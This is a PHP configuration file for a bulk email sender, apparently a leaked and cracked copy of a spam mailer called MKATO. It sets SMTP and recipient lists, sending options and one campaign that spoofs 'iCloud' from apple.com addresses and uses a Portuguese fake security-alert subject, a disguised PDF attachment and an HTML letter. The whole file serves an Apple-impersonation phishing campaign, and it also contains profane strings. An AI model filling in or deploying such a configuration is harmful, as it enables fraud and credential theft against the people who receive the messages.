<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
FuCkeD By  [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
###############################################
#$            C0d3d by Amoskun               $#
#$  Recoding Tidak membuatmu menjadi Coder   $#
#$          Copyright 2019 MKATO             $#
###############################################
$timeset = 'Asia/Jakarta'; // reference for timezone http://php.net/manual/en/timezones.php


$mkato_smtp = 'd3g1d5.csv';
$mkato_list = [
	'file'				=> 'list.txt',
	'removeduplicate'	=> false,
];

$mkato_base = [
	'user'  => [ 'license'	=> 'FUCKED-BY-DNTHIRTEEN-L34KC0DE',
				 'cookie'	=> 'l34kc0de_session=GO-FUCK-YOURSELF',
				],
	'base'	=> 'swiftmailer' // phpmailer or swiftmailer
];

$mkato_setting = [
	'color'				=> true,
	'max'				=> '1', // total of emails to send per sending
	'delay'				=> '0', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'quoted-printable', // quoted-printable or base64 or 7bit or 8bit
	'insertemailtest'	=> false, // instert your email at last sending
	'emailtest'			=> 'd3g1d5@gmail.com', // input your email , can be multi emails
	'priority'			=> '3',	// for phpmailer: 1=high, 3=normal, 5=low || for swiftmailer 1=very high, 2=high, 3=normal, 4=low, 5=very low
	'randomparam'		=> true,
	'link'				=> 'https://www.facebook.com/groups/leakcode/', // input link here to use a random link fiture
	'header'			=> false, // optional to use header or not | true or false
];

$mkato_replace = [
		'##name##'		=> 'rias|koneko|index',	
		'##hero##'		=> 'saber|akatsuki|touma',
		'##goblok##'	=> '##mix_normal_6##|##mix_normal_10##',
];

$mkato_header = array(
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
);

$mkato_inbox = [
	#--start--#
	[
		'to' 					=> 'service@apple.com|appleid@apple.com', // to
		'fname' 				=> 'iCloud', // from name
		'subject' 				=> "Re: 📧 ALERTA ❗ [ Relatório de Notificação ] Aviso de segurança - Adicionadas informações de segurança para a conta.", // subject
		'attachfile'			=> '5.pdf', // nama file pdf, kalau gak mau attach file, jangan diisi kolomnya
		'attachname' 			=> "Docx._##number_normal_8##.pdf", // nama yang diinginkan untuk ganti nama file
		'letter'				=> 'bra.html',

	],
	#--end--#

];





?>